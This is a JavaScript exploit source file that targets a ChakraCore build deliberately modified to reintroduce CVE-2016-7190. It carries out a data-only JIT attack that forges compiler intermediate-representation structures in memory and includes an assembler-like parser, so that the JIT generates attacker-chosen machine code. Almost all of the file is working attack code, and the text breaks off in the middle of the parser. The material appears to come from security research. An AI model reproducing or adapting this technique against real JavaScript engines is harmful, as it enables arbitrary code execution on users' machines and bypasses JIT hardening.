// ----------------------------------------------------------------------------
// Data-only attack against the JIT compiler to generate arbitrary code 
// 
//  Goal:
//   Inject arbitrary code into the JIT code cache memory.
//
//  Technique:
//   Modify the intermediate representation to force the JIT compiler to
//   generate a malicious program.
//
//  Test Environment:
//   i7-4578U CPU @ 3.00GHz (2 cores)
//   Windows 10 Pro (10.0.14393 Build 14393)
//   Microsoft Visual Studio Enterprise 2015 Version 14.0.24720.00 Update 1
//   ChakraCore
//    * Version: release/1.4 (2f28746ae1f73945aa2d9cd44ef65e6e4d2444e2)
//    * Build: Release|x64
//    * ChakraCore was modified to reintroduce CVE-2016-7190 and to enable
//      console output via JavaScript (str.substring)
//   
// ----------------------------------------------------------------------------



function print(str) {
   str = str + "";
   str.substring(1337,1);
}

function hex(a) {
  if (a == undefined) return "0xUNDEFINED";
  var ret = a.toString(16);
  if (ret.substr(0,2) != "0x") return "0x"+ret;
  else return ret;
}


// based on Long.js by dcodeIO
// https://github.com/dcodeIO/Long.js
// License Apache 2
class _u64 {
   constructor(hi, lo) {
      this.lo_ = lo;
      this.hi_ = hi;
   }
   
   hex() {
      var hlo = (this.lo_ < 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_).toString(16)
      var hhi = (this.hi_ < 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_).toString(16)
      if(hlo.substr(0,2) == "0x") hlo = hlo.substr(2,hlo.length);
      if(hhi.substr(0,2) == "0x") hhi = hhi.substr(2,hji.length);
      hlo = "00000000" + hlo
      hlo = hlo.substr(hlo.length-8, hlo.length);
      return "0x" + hhi + hlo;
   }
   
   isZero() {
      return this.hi_ == 0 && this.lo_ == 0;
   }
   
   equals(val) {
      return this.hi_ == val.hi_ && this.lo_ == val.lo_;
   }
   
   and(val) {
      return new _u64(this.hi_ & val.hi_, this.lo_ & val.lo_);
   }
   
   add(val) {
      var a48 = this.hi_ >>> 16;
      var a32 = this.hi_ & 0xFFFF;
      var a16 = this.lo_ >>> 16;
      var a00 = this.lo_ & 0xFFFF;

      var b48 = val.hi_ >>> 16;
      var b32 = val.hi_ & 0xFFFF;
      var b16 = val.lo_ >>> 16;
      var b00 = val.lo_ & 0xFFFF;

      var c48 = 0, c32 = 0, c16 = 0, c00 = 0;
      c00 += a00 + b00;
      c16 += c00 >>> 16;
      c00 &= 0xFFFF;
      c16 += a16 + b16;
      c32 += c16 >>> 16;
      c16 &= 0xFFFF;
      c32 += a32 + b32;
      c48 += c32 >>> 16;
      c32 &= 0xFFFF;
      c48 += a48 + b48;
      c48 &= 0xFFFF;

      return new _u64((c48 << 16) | c32, (c16 << 16) | c00);
   }
   
   addi(h,l) {
      return this.add(new _u64(h,l));
   }
   
   subi(h,l) {
      return this.sub(new _u64(h,l));
   }
   
   not() {
      return new _u64(~this.hi_, ~this.lo_)
   }
   
   neg() {
      return this.not().add(new _u64(0,1));
   }
   
   sub(val) {
      return this.add(val.neg());
   };

   swap32(val) {
      return ((val & 0xFF) << 24) | ((val & 0xFF00) << 8) |
            ((val >> 8) & 0xFF00) | ((val >> 24) & 0xFF);
   }

   bswap() {
      var lo = swap32(this.lo_);
      var hi = swap32(this.hi_);
      return new _u64(lo, hi);
   };
}
var u64 = function(hi, lo) { return new _u64(hi,lo) };



function mo_gen_instr_label() {
   var mo = new Uint8Array(0x98);

   // ChakraCore!IR::LabelInstr
   // +0x000 dataWidth        : UChar
   // +0x008 m_next           : Ptr64 IR::Instr
   // +0x010 m_prev           : Ptr64 IR::Instr
   // +0x018 m_func           : Ptr64 Func
   // +0x020 m_opcode         : Js::OpCode
   // +0x022 ignoreOverflowBitCount : UChar
   // +0x023 dstIsTempNumber  : Pos 0, 1 Bit
   // +0x023 dstIsTempNumberTransferred : Pos 1, 1 Bit
   // +0x023 dstIsTempObject  : Pos 2, 1 Bit
   // +0x023 usesStackArgumentsObject : Pos 3, 1 Bit
   // +0x023 isInlineeEntryInstr : Pos 4, 1 Bit
   // +0x023 ignoreNegativeZero : Pos 5, 1 Bit
   // +0x023 ignoreIntOverflow : Pos 6, 1 Bit
   // +0x023 ignoreIntOverflowInRange : Pos 7, 1 Bit
   // +0x024 forcePreOpBailOutIfNeeded : Pos 0, 1 Bit
   // +0x024 loadedArrayHeadSegment : Pos 1, 1 Bit
   // +0x024 loadedArrayHeadSegmentLength : Pos 2, 1 Bit
   // +0x024 extractedUpperBoundCheckWithoutHoisting : Pos 3, 1 Bit
   // +0x024 isCtorCall       : Pos 4, 1 Bit
   // +0x024 dstIsAlwaysConvertedToInt32 : Pos 5, 1 Bit
   // +0x024 dstIsAlwaysConvertedToNumber : Pos 6, 1 Bit
   // +0x024 isCallInstrProtectedByNoProfileBailout : Pos 7, 1 Bit
   // +0x025 isCloned         : Pos 0, 1 Bit
   // +0x025 hasBailOutInfo   : Pos 1, 1 Bit
   // +0x025 hasAuxBailOut    : Pos 2, 1 Bit
   // +0x026 m_kind           : IR::IRKind
   // +0x028 m_number         : Uint4B
   // +0x030 m_dst            : Ptr64 IR::Opnd
   // +0x038 m_src1           : Ptr64 IR::Opnd
   // +0x040 m_src2           : Ptr64 IR::Opnd
   // +0x048 labelRefs        : SListCounted<IR::BranchInstr *,Memory::ArenaAllocator>
   // +0x060 m_regContent     : Ptr64 Ptr64 Lifetime
   // +0x068 m_isLoopTop      : Pos 0, 1 Bit
   // +0x068 isOpHelper       : Pos 1, 1 Bit
   // +0x068 m_hasNonBranchRef : Pos 2, 1 Bit
   // +0x068 m_isDataLabel    : Pos 3, 1 Bit
   // +0x068 m_isForInExit    : Pos 4, 1 Bit
   // +0x06c m_id             : Uint4B
   // +0x070 m_loweredBasicBlock : Ptr64 LoweredBasicBlock
   // +0x078 m_pc             : IR::LabelInstr::labelLocation
   // +0x080 m_block          : Ptr64 BasicBlock
   // +0x088 m_loop           : Ptr64 Loop
   // +0x090 m_region         : Ptr64 Region


   opc = 0x154;
   mo[0x20] = (opc >> 0) & 0xFF;
   mo[0x21] = (opc >> 8) & 0xFF;
   mo[0x22] = 0x20;
   mo[0x26] = 0x3;
   mo[0x28] = 0xFF;
   mo[0x29] = 0xFF;
   mo[0x2A] = 0xFF;
   mo[0x2B] = 0xFF;
   mo[0x68] = 0x2;
   mo[0x6C] = 0xD;
   
   return mo;
}

function mo_gen_instr_branch(o) {
   var mo = new Uint8Array(0x68);

   // ChakraCore!IR::BranchInstr
   // +0x000 dataWidth        : UChar
   // +0x008 m_next           : Ptr64 IR::Instr
   // +0x010 m_prev           : Ptr64 IR::Instr
   // +0x018 m_func           : Ptr64 Func
   // +0x020 m_opcode         : Js::OpCode
   // +0x022 ignoreOverflowBitCount : UChar
   // +0x023 dstIsTempNumber  : Pos 0, 1 Bit
   // +0x023 dstIsTempNumberTransferred : Pos 1, 1 Bit
   // +0x023 dstIsTempObject  : Pos 2, 1 Bit
   // +0x023 usesStackArgumentsObject : Pos 3, 1 Bit
   // +0x023 isInlineeEntryInstr : Pos 4, 1 Bit
   // +0x023 ignoreNegativeZero : Pos 5, 1 Bit
   // +0x023 ignoreIntOverflow : Pos 6, 1 Bit
   // +0x023 ignoreIntOverflowInRange : Pos 7, 1 Bit
   // +0x024 forcePreOpBailOutIfNeeded : Pos 0, 1 Bit
   // +0x024 loadedArrayHeadSegment : Pos 1, 1 Bit
   // +0x024 loadedArrayHeadSegmentLength : Pos 2, 1 Bit
   // +0x024 extractedUpperBoundCheckWithoutHoisting : Pos 3, 1 Bit
   // +0x024 isCtorCall       : Pos 4, 1 Bit
   // +0x024 dstIsAlwaysConvertedToInt32 : Pos 5, 1 Bit
   // +0x024 dstIsAlwaysConvertedToNumber : Pos 6, 1 Bit
   // +0x024 isCallInstrProtectedByNoProfileBailout : Pos 7, 1 Bit
   // +0x025 isCloned         : Pos 0, 1 Bit
   // +0x025 hasBailOutInfo   : Pos 1, 1 Bit
   // +0x025 hasAuxBailOut    : Pos 2, 1 Bit
   // +0x026 m_kind           : IR::IRKind
   // +0x028 m_number         : Uint4B
   // +0x030 m_dst            : Ptr64 IR::Opnd
   // +0x038 m_src1           : Ptr64 IR::Opnd
   // +0x040 m_src2           : Ptr64 IR::Opnd
   // +0x048 m_isAirlock      : Pos 0, 1 Bit
   // +0x048 m_isSwitchBr     : Pos 1, 1 Bit
   // +0x048 m_isOrphanedLeave : Pos 2, 1 Bit
   // +0x050 m_regContent     : Ptr64 Ptr64 Lifetime
   // +0x058 m_branchTarget   : Ptr64 IR::LabelInstr
   // +0x060 m_byteCodeReg    : Uint4B



   opc ={ "jne" :  958,
          "je"  :  957
        };

   mo[0x20] = (opc[o] >> 0) & 0xFF;
   mo[0x21] = (opc[o] >> 8) & 0xFF;
   mo[0x22] = 0x20;
   mo[0x26] = 0x2; // InstrKindBranch
   mo[0x28] = 0xFF;
   mo[0x29] = 0xFF;
   mo[0x2A] = 0xFF;
   mo[0x2B] = 0xFF;

   mo[0x60] = 0xFF;
   mo[0x68] = 0xFF;
   
   return mo;
}


function mo_gen_ind_opnd() {
   var mo = new Uint8Array(0x28);

   // ChakraCore!IR::IndirOpnd
   // +0x000 m_valueType      : ValueType
   // +0x002 m_type           : IRType
   // +0x003 m_isValueTypeFixed : Pos 0, 1 Bit
   // +0x003 m_inUse          : Pos 1, 1 Bit
   // +0x003 m_isDead         : Pos 2, 1 Bit
   // +0x003 m_isJITOptimizedReg : Pos 3, 1 Bit
   // +0x003 canStoreTemp     : Pos 4, 1 Bit
   // +0x003 isDiagHelperCallOpnd : Pos 5, 1 Bit
   // +0x003 isPropertySymOpnd : Pos 6, 1 Bit
   // +0x004 m_kind           : IR::OpndKind
   // +0x006 m_dontEncode     : Bool
   // +0x008 m_baseOpnd       : Ptr64 IR::RegOpnd
   // +0x010 m_indexOpnd      : Ptr64 IR::RegOpnd
   // +0x018 m_offset         : Int4B
   // +0x01c m_scale          : UChar
   // +0x020 m_func           : Ptr64 Func

   mo[0]  = 0x09;
   mo[1]  = 0x00;
   mo[2]  = 0x04;
   mo[4]  = 0x02;
   mo[4]  = 0x09;
   
   return mo;
}

function mo_gen_addr_opnd(u64_val) {
   var mo = new Uint8Array(0x28);

   // ChakraCore!IR::AddrOpnd
   // +0x000 m_valueType      : ValueType
   // +0x002 m_type           : IRType
   // +0x003 m_isValueTypeFixed : Pos 0, 1 Bit
   // +0x003 m_inUse          : Pos 1, 1 Bit
   // +0x003 m_isDead         : Pos 2, 1 Bit
   // +0x003 m_isJITOptimizedReg : Pos 3, 1 Bit
   // +0x003 canStoreTemp     : Pos 4, 1 Bit
   // +0x003 isDiagHelperCallOpnd : Pos 5, 1 Bit
   // +0x003 isPropertySymOpnd : Pos 6, 1 Bit
   // +0x004 m_kind           : IR::OpndKind
   // +0x008 m_metadata       : Ptr64 Void
   // +0x010 m_localAddress   : Ptr64 Void
   // +0x018 m_address        : Ptr64 Void
   // +0x020 m_dontEncode     : Pos 0, 1 Bit
   // +0x020 m_isFunction     : Pos 1, 1 Bit
   // +0x021 addrOpndKind     : IR::AddrOpndKind

   mo[0]  = 0x09;
   mo[1]  = 0x00;
   mo[2]  = 0x08;
   mo[4]  = 0x08;
   // m[16-23] and m[24-31] contain the addr
   mo[0x10] = mo[0x18] = (u64_val.lo_ >>  0) & 0xFF;
   mo[0x11] = mo[0x19] = (u64_val.lo_ >>  8) & 0xFF;
   mo[0x12] = mo[0x1A] = (u64_val.lo_ >> 16) & 0xFF;
   mo[0x13] = mo[0x1B] = (u64_val.lo_ >> 24) & 0xFF;
   mo[0x14] = mo[0x1C] = (u64_val.hi_ >>  0) & 0xFF;
   mo[0x15] = mo[0x1D] = (u64_val.hi_ >>  8) & 0xFF;
   mo[0x16] = mo[0x1E] = (u64_val.hi_ >> 16) & 0xFF;
   mo[0x17] = mo[0x1F] = (u64_val.hi_ >> 24) & 0xFF;
   // IR::AddrOpndKind
   mo[0x21] = 5;

   return mo;
}

function mo_gen_reg_opnd(reg) {
   var mo = new Uint8Array(0x18);

   // ChakraCore!IR::RegOpnd
   // +0x000 m_valueType      : ValueType
   // +0x002 m_type           : IRType
   // +0x003 m_isValueTypeFixed : Pos 0, 1 Bit
   // +0x003 m_inUse          : Pos 1, 1 Bit
   // +0x003 m_isDead         : Pos 2, 1 Bit
   // +0x003 m_isJITOptimizedReg : Pos 3, 1 Bit
   // +0x003 canStoreTemp     : Pos 4, 1 Bit
   // +0x003 isDiagHelperCallOpnd : Pos 5, 1 Bit
   // +0x003 isPropertySymOpnd : Pos 6, 1 Bit
   // +0x004 m_kind           : IR::OpndKind
   // +0x008 m_sym            : Ptr64 StackSym
   // +0x010 m_isTempLastUse  : Pos 0, 1 Bit
   // +0x010 m_isCallArg      : Pos 1, 1 Bit
   // +0x010 m_dontDeadStore  : Pos 2, 1 Bit
   // +0x010 m_fgPeepTmp      : Pos 3, 1 Bit
   // +0x010 m_wasNegativeZeroPreventedByBailout : Pos 4, 1 Bit
   // +0x010 m_isArrayRegOpnd : Pos 5, 1 Bit
   // +0x014 m_reg            : RegNum 

   reg_num ={  "rax"  :  1,
               "rcx"  :  2,
               "rdx"  :  3,
               "rbx"  :  4,
               "rsp"  :  5,
               "rbp"  :  6,
               "rsi"  :  7,
               "rdi"  :  8,
               "r8"   :  9,
               "r9"   : 10,
               "r10"  : 11,
               "r11"  : 12,
               "r12"  : 13,
               "r13"  : 14,
               "r14"  : 15,
               "r15"  : 16,
                                       
               "eax"  :  1 + 20,
               "ecx"  :  2 + 20,
               "edx"  :  3 + 20,
               "ebx"  :  4 + 20,
               "esp"  :  5 + 20,
               "ebp"  :  6 + 20,
               "esi"  :  7 + 20,
               "edi"  :  8 + 20,
               "r8d"  :  9 + 20,
               "r9d"  : 10 + 20,
               "r10d" : 11 + 20,
               "r11d" : 12 + 20,
               "r12d" : 13 + 20,
               "r13d" : 14 + 20,
               "r14d" : 15 + 20,
               "r15d" : 16 + 20,
                  
               "ax"   :  1 + 40,
               "cx"   :  2 + 40,
               "dx"   :  3 + 40,
               "bx"   :  4 + 40,
               "sp"   :  5 + 40,
               "bp"   :  6 + 40,
               "si"   :  7 + 40,
               "di"   :  8 + 40,
               "r8w"  :  9 + 40,
               "r9w"  : 10 + 40,
               "r10w" : 11 + 40,
               "r11w" : 12 + 40,
               "r12w" : 13 + 40,
               "r13w" : 14 + 40,
               "r14w" : 15 + 40,
               "r15w" : 16 + 40,
                  
               "al"   :  1 + 60,
               "cl"   :  2 + 60,
               "dl"   :  3 + 60,
               "bl"   :  4 + 60,
                   
               "r8b"  :  9 + 60,
               "r9b"  : 10 + 60,
               "r10b" : 11 + 60,
               "r11b" : 12 + 60,
               "r12b" : 13 + 60,
               "r13b" : 14 + 60,
               "r14b" : 15 + 60,
               "r15b" : 16 + 60,
            };
            
   var m_reg = reg_num[reg];
   var m_type = 0;
   
   // TyUint8 = 0n5
   // TyUint16 = 0n6
   // TyUint32 = 0n7
   // TyUint64 = 0n8

   // 64
   if( 1 <= m_reg && m_reg <= 16) {
      m_type = 4;
   }
   // 32
   else if(21 <= m_reg && m_reg <= 36) {
      m_type = 7;
      m_reg = m_reg - 20;
   }
   else if(41 <= m_reg && m_reg <= 56) {
      m_type = 6;
      m_reg = m_reg - 40;
   }
   else if(61 <= m_reg && m_reg <= 76) {
      m_type = 5;
      m_reg = m_reg - 60;
   }
   else {
      
   }
   
   mo[0]    = 0x09;
   mo[1]    = 0x00;
   mo[2]    = m_type;
   mo[3]    = 0x02;
   mo[4]    = 0x07;
   mo[0x0C] = 0x01;
   mo[0x14] = m_reg;
   return mo;
}

function mo_gen_const(u64_val) {
   var mo = new Uint8Array(0x10);

   // ChakraCore!IR::IntConstOpnd
   mo[0x8] = (u64_val.lo_ >>  0) & 0xFF;
   mo[0x9] = (u64_val.lo_ >>  8) & 0xFF;
   mo[0xA] = (u64_val.lo_ >> 16) & 0xFF;
   mo[0xB] = (u64_val.lo_ >> 24) & 0xFF;
   mo[0xC] = (u64_val.hi_ >>  0) & 0xFF;
   mo[0xD] = (u64_val.hi_ >>  8) & 0xFF;
   mo[0xE] = (u64_val.hi_ >> 16) & 0xFF;
   mo[0xF] = (u64_val.hi_ >> 24) & 0xFF;

   return mo;
}

function mo_gen_instr(o) {
   var mo = new Uint8Array(0x48);

   // ChakraCore!IR::Instr
   // +0x000 dataWidth        : UChar
   // +0x008 m_next           : Ptr64 IR::Instr
   // +0x010 m_prev           : Ptr64 IR::Instr
   // +0x018 m_func           : Ptr64 Func
   // +0x020 m_opcode         : Js::OpCode
   // +0x022 ignoreOverflowBitCount : UChar
   // +0x023 dstIsTempNumber  : Pos 0, 1 Bit
   // +0x023 dstIsTempNumberTransferred : Pos 1, 1 Bit
   // +0x023 dstIsTempObject  : Pos 2, 1 Bit
   // +0x023 usesStackArgumentsObject : Pos 3, 1 Bit
   // +0x023 isInlineeEntryInstr : Pos 4, 1 Bit
   // +0x023 ignoreNegativeZero : Pos 5, 1 Bit
   // +0x023 ignoreIntOverflow : Pos 6, 1 Bit
   // +0x023 ignoreIntOverflowInRange : Pos 7, 1 Bit
   // +0x024 forcePreOpBailOutIfNeeded : Pos 0, 1 Bit
   // +0x024 loadedArrayHeadSegment : Pos 1, 1 Bit
   // +0x024 loadedArrayHeadSegmentLength : Pos 2, 1 Bit
   // +0x024 extractedUpperBoundCheckWithoutHoisting : Pos 3, 1 Bit
   // +0x024 isCtorCall       : Pos 4, 1 Bit
   // +0x024 dstIsAlwaysConvertedToInt32 : Pos 5, 1 Bit
   // +0x024 dstIsAlwaysConvertedToNumber : Pos 6, 1 Bit
   // +0x024 isCallInstrProtectedByNoProfileBailout : Pos 7, 1 Bit
   // +0x025 isCloned         : Pos 0, 1 Bit
   // +0x025 hasBailOutInfo   : Pos 1, 1 Bit
   // +0x025 hasAuxBailOut    : Pos 2, 1 Bit
   // +0x026 m_kind           : IR::IRKind
   // +0x028 m_number         : Uint4B
   // +0x030 m_dst            : Ptr64 IR::Opnd
   // +0x038 m_src1           : Ptr64 IR::Opnd
   // +0x040 m_src2           : Ptr64 IR::Opnd

   opc ={ "int3" :  952,
          "mov"  :  976,
          "add"  :  882,
          "sub"  : 1078,
          "push" : 1005,
          "pop"  : 1004,
          "call" :  897,
          "jmp"  :  969,
          "xor"  : 1088,
          "and"  :  887,
          "or"   : 1006,
          "cmp"  :  916};

   mo[0x20] = (opc[o] >> 0) & 0xFF;
   mo[0x21] = (opc[o] >> 8) & 0xFF;
   mo[0x22] = 0x20;
   mo[0x26] = 0x1;
   mo[0x28] = 0xFF;
   mo[0x29] = 0xFF;
   mo[0x2A] = 0xFF;
   mo[0x2B] = 0xFF;
   

   return mo;
}

function copy_and_patch_mo_instr(w8, w64, u64_val_buf, u64_val_m_func, uint8arr_instr, uint8arr_m_dst, uint8arr_src1, uint8arr_src2, io_type, uint8arr_ind_op) {
   var u64_val_buf_addr_instr  = u64(u64_val_buf.hi_, u64_val_buf.lo_);
   var u64_val_buf_addr_m_dst  = null;
   var u64_val_buf_addr_m_src1 = null;
   var u64_val_buf_addr_m_src2 = null;
   var u64_val_buf_addr_ind_op = null;
   var u64_val_buf_curr       = u64(u64_val_buf.hi_, u64_val_buf.lo_);

   // copy instr
   for(var i = 0; i < uint8arr_instr.length; ++i) {
      w8(u64_val_buf_addr_instr.addi(0,i), uint8arr_instr[i]);
   }
   u64_val_buf_curr = u64_val_buf_curr.addi(0,uint8arr_instr.length);

   if(uint8arr_m_dst != null) {
      u64_val_buf_addr_m_dst = u64(u64_val_buf_curr.hi_, u64_val_buf_curr.lo_);

      for(var i = 0; i < uint8arr_m_dst.length; ++i) {
         w8(u64_val_buf_addr_m_dst.addi(0,i), uint8arr_m_dst[i]);
      }
      u64_val_buf_curr = u64_val_buf_curr.addi(0,uint8arr_m_dst.length);
      // write m_dst ptr to IR::instr
      w64(u64_val_buf_addr_instr.addi(0,0x30), u64_val_buf_addr_m_dst);
   }

   if(uint8arr_src1 != null) {
      u64_val_buf_addr_m_src1 = u64(u64_val_buf_curr.hi_, u64_val_buf_curr.lo_);

      for(var i = 0; i < uint8arr_src1.length; ++i) {
         w8(u64_val_buf_addr_m_src1.addi(0,i), uint8arr_src1[i]);
      }
      u64_val_buf_curr = u64_val_buf_curr.addi(0,uint8arr_src1.length);
      // write m_src1 ptr to IR::instr
      w64(u64_val_buf_addr_instr.addi(0,0x38), u64_val_buf_addr_m_src1);
   }

   if(uint8arr_src2 != null) {
      u64_val_buf_addr_m_src2 = u64(u64_val_buf_curr.hi_, u64_val_buf_curr.lo_);

      for(var i = 0; i < uint8arr_src2.length; ++i) {
         w8(u64_val_buf_addr_m_src2.addi(0,i), uint8arr_src2[i]);
      }
      u64_val_buf_curr = u64_val_buf_curr.addi(0,uint8arr_src2.length);
      // write m_src2 ptr to IR::instr
      w64(u64_val_buf_addr_instr.addi(0,0x40), u64_val_buf_addr_m_src2);
   }
   
   // if dst or src was an indirect operation patch it to include the real op
   if(io_type != null) {
      u64_val_buf_addr_ind_op = u64(u64_val_buf_curr.hi_, u64_val_buf_curr.lo_);
      
      for(var i = 0; i < uint8arr_ind_op.length; ++i) {
         w8(u64_val_buf_addr_ind_op.addi(0,i), uint8arr_ind_op[i]);
      }
      
      u64_val_buf_curr = u64_val_buf_curr.addi(0,uint8arr_ind_op.length);
      
      if(io_type == "m_dst") {
         // ChakraCore!IR::IndirOpnd->m_baseOpnd
         w64(u64_val_buf_addr_m_dst.addi(0,0x8), u64_val_buf_addr_ind_op);
         // ChakraCore!IR::IndirOpnd->m_func
         w64(u64_val_buf_addr_m_dst.addi(0,0x20), u64_val_m_func);
      }
      
      if(io_type == "m_src1") {
         // ChakraCore!IR::IndirOpnd->m_baseOpnd
         w64(u64_val_buf_addr_m_src1.addi(0,0x8), u64_val_buf_addr_ind_op);
         // ChakraCore!IR::IndirOpnd->m_func
         w64(u64_val_buf_addr_m_src1.addi(0,0x20), u64_val_m_func);
      }
      
      
   }

   // write m_func ptr to IR::instr
   w64(u64_val_buf_addr_instr.addi(0,0x18), u64_val_m_func);

   return u64_val_buf_curr;
}


class _instr_op2 {
   constructor(instr, op1_type, op1, op2_type, op2) {
      this.instr_    = instr;
      this.op1_type_ = op1_type;
      this.op1_      = op1;
      this.op2_type_ = op2_type;
      this.op2_      = op2;
   }

   to_mem(w8, w64, u64_val_buf, u64_val_m_func) {
      var instr     = mo_gen_instr(this.instr_);
      var m_dst     = null;
      var m_src1    = null;
      var m_src2    = null;
      var io_type   = null;
      var ind_op    = null;

      if(this.op1_type_ == "TYPE_REG") {
         m_dst = mo_gen_reg_opnd(this.op1_);
      }

      else if(this.op1_type_ == "TYPE_IND_REG") {
         m_dst   = mo_gen_ind_opnd();
         var tmp_op = this.op1_.replace(/[^a-z0-9]/g, "");
         ind_op  = mo_gen_reg_opnd(tmp_op);
         io_type = "m_dst";
      }

      else {
         throw "--> _instr_op2.to_mem().op1_type_";
      }

      if(this.op2_type_ == "TYPE_REG") {
         m_src1 = mo_gen_reg_opnd(this.op2_);
      }
      
      else if(this.op2_type_ == "TYPE_IMM")  {
         m_src1 = mo_gen_addr_opnd(this.op2_);
      }
      
      else if(this.op2_type_ == "TYPE_IND_REG") {
         m_src1   = mo_gen_ind_opnd();
         var tmp_op = this.op2_.replace(/[^a-z0-9]/g, "");
         ind_op  = mo_gen_reg_opnd(tmp_op);
         io_type = "m_src1";
      }

      else {
         throw "--> _instr_op2.to_mem().op2_type_";
      }  
      
      if(["add", "sub", "xor", "and", "or"].indexOf(this.instr_) != -1) {
         m_src2 = m_src1;
         m_src1 = m_dst;
      }
      else if(this.instr_ == "cmp") {
         m_src2 = m_src1;
         m_src1 = m_dst;
         m_dst == null;
      }

      return copy_and_patch_mo_instr(w8, w64, u64_val_buf, u64_val_m_func, instr, m_dst, m_src1, m_src2, io_type, ind_op);

   }

   toString() {
      return this.instr_ + " " + this.op1_  + " (" +  this.op1_type_ + "), " + this.op2_  + " (" +  this.op2_type_ + ")";
   }

}

class _instr_op1 {
   constructor(instr, op1_type, op1) {
      this.instr_    = instr;
      this.op1_type_ = op1_type;
      this.op1_      = op1;
   }

   to_mem(w8, w64, u64_val_buf, u64_val_m_func) {
      var instr     = mo_gen_instr(this.instr_);
      var m_dst     = null;
      var m_src1    = null;

      if(this.op1_type_ == "TYPE_REG") {
         if(["push", "call", "jmp"].indexOf(this.instr_) != -1) {
            m_src1  = mo_gen_reg_opnd(this.op1_);
         }
         else if(this.instr_ == "int3") {
            m_src1 = mo_gen_const(u64(0,0x3));
         }
         else {
            m_dst = mo_gen_reg_opnd(this.op1_); 
         }
      }
      else {
         throw "--> _instr_op1.to_mem().op1_type_";
      }

      return copy_and_patch_mo_instr(w8, w64, u64_val_buf, u64_val_m_func, instr, m_dst, m_src1, null, null, null);
   }

   toString() {
      return this.instr_ + " " + this.op1_  + " (" +  this.op1_type_ + ")";
   }

}

class _instr_op0 {
   constructor(instr) {
      this.instr_    = instr;
   }

   to_mem(w8, w64, u64_val_buf, u64_val_m_func) {
      var instr     = mo_gen_instr(this.instr_);

      return copy_and_patch_mo_instr(w8, w64, u64_val_buf, u64_val_m_func, instr, null, null, null, null, null);
   }

   toString() {
      return this.instr_;
   }

}

class _instr_label {
   constructor(label) {
      this.label_    = label;
      this.addr_     = null;
   }

   to_mem(w8, w64, u64_val_buf, u64_val_m_func) {
      var instr     = mo_gen_instr_label();

      this.addr_  = u64(u64_val_buf.hi_, u64_val_buf.lo_);
      return copy_and_patch_mo_instr(w8, w64, u64_val_buf, u64_val_m_func, instr, null, null, null, null, null);;
   }

   get_addr() {
      return this.addr_;
   }

   get_label_name() {
      return this.label_;
   }

   toString() {
      return this.instr_;
   }

}

class _instr_branch {
   constructor(instr, op1_type, label) {
      this.instr_    = instr;
      this.op1_type_ = op1_type;
      this.op1_      = label;
      this.addr_     = null;
   }

   to_mem(w8, w64, u64_val_buf, u64_val_m_func) {
      var instr         = mo_gen_instr_branch(this.instr_);
      var m_branchTarget  = null;

      if(this.op1_type_ != "TYPE_LABEL") {
         throw "_instr_branch should only have label as op"
      }

      this.addr_  = u64(u64_val_buf.hi_, u64_val_buf.lo_);
      return copy_and_patch_mo_instr(w8, w64, u64_val_buf, u64_val_m_func, instr, null, null, null, null, null);
   }

   get_addr() {
      return this.addr_;
   }

   get_label_name() {
      return this.op1_;
   }

   toString() {
      return this.instr_ + " " + this.op1_  + " (" +  this.op1_type_ + ")";
   }

}


class _compiler {
   constructor(w8, w64, attack_payload, u64_val_m_func, args) {
      this.payload_ = attack_payload;
      this.u64_val_m_func_ = u64_val_m_func;
      this.w8_ = w8;
      this.w64_ = w64;
      this.ins_arr_ = new Array();
      this.ins_obj_arr_ = new Array();
      this.parser_status_ = "";
      
      for(var arg in args) {
         var re = new RegExp(arg, "g");
         this.payload_ = this.payload_.replace(re, args[arg]);
      }
      
   }
   
   is_invalid_ins(ins) {
      return ["mov", "add", "sub", "xor", "and", "or", "cmp",
              "push", "pop", "call", "jmp", "je", "jne",
              "int3"].indexOf(ins) == -1;
   }

   is_valid_reg(reg) {
      return ["rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi",
              "r8", "r9", "r10", "r11", "r12", "r13", "r14",
              "eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi",
              "r8d", "r9d", "r10d", "r11d", "r12d", "r13d", "r14d",
              "ax", "cx", "dx", "bx", "sp", "bp", "si", "di",
              "r8w", "r9w", "r10w", "r11w", "r12w", "r13w", "r14w",
              "al", "cl", "dl", "bl",
              "r8b", "r9b", "r10b", "r11b", "r12b", "r13b", "r14b"].indexOf(reg) != -1;   
   }

   get_op_type(op) {
      if(op[0] == "[") {
         var tmp_op = op.replace(/[^a-z0-9]/g, "");
         if(tmp_op[0] == "0" && tmp_op[1] == "x") {
               return "TYPE_IND_MEM_ADDR";
            }
         else if(this.is_valid_reg(tmp_op)) {
            return "TYPE_IND_REG";
         }
         else {
            return null;
         }
      }

      else if(this.is_valid_reg(op)) {
         return "TYPE_REG";
      }

      else if (op[0] == "0" && op[1] == "x") {
         return "TYPE_IMM";
      }

      else if (op[0] == "L") {
         return "TYPE_LABEL";
      }

      else {
         return null;
      }
   }

   get_parser_status() {
      return this.parser_status_;
   }

   reverse_string(s) {
      return s.split("").reverse().join("");
   }
   
   imm_to_u64(imm) {
      var hi = 0;
      var lo = 0;
      
      // 64 bit
      if(imm.length > 10) {
         hi = parseInt(imm.substring(2,imm.length-8), 16);
         lo = parseInt(imm.substring(imm.length-8), 16);
      }
      // 32 bit
      else {
         lo = parseInt(imm.substring(2), 16);
      }
      
      return u64(hi,lo);
   }

   // ****  Step 3.1  **** 
   parse() {
      var payload_lines = this.payload_.split('\n');
      for(var i = 0; i < payload_lines.length; ++i) {
         
         // remove spaces in beginning
         var insl = payload_lines[i].replace(/[ \t]+/i, ""); 

         // the following 3 lines are sponsored by poor
         // regex skills...
         // remove spaces in the end
         insl = this.reverse_string(insl);
         insl.replace(/[ \t]+/i, ""); 
         insl = this.reverse_string(insl);

         // skip comment lines
         if(insl[0] == ";") {
            continue;
         }

         // label
         if(insl[0] == "L") {
            this.ins_arr_.push(new _instr_label(insl.replace(/\W+/g, "")));
            continue;
         }

         // get instruction and operands
         var tinsl = insl.split(" ");

         if(tinsl.length == 0 || this.is_invalid_ins(tinsl[0])) {
            this.parser_status_ = "Line " + i + ": invalid instruction";
            return false;
         }

         // get instruction name
         var ins      = tinsl[0]; 
         // convert operands string into an array
         var operands = insl.replace(ins, "").replace(/ /g, "").split(",");


         // int3
         if(operands.length == 1 && operands[0] == "") {
            if(ins == "int3") {
               this.ins_arr_.push(new _instr_op1(ins, "TYPE_REG", "rax"));
            }
         }

         // push pop call jmp
         else if(operands.length == 1) {
            var op      = operands[0];
            var op_type = this.get_op_type(op);

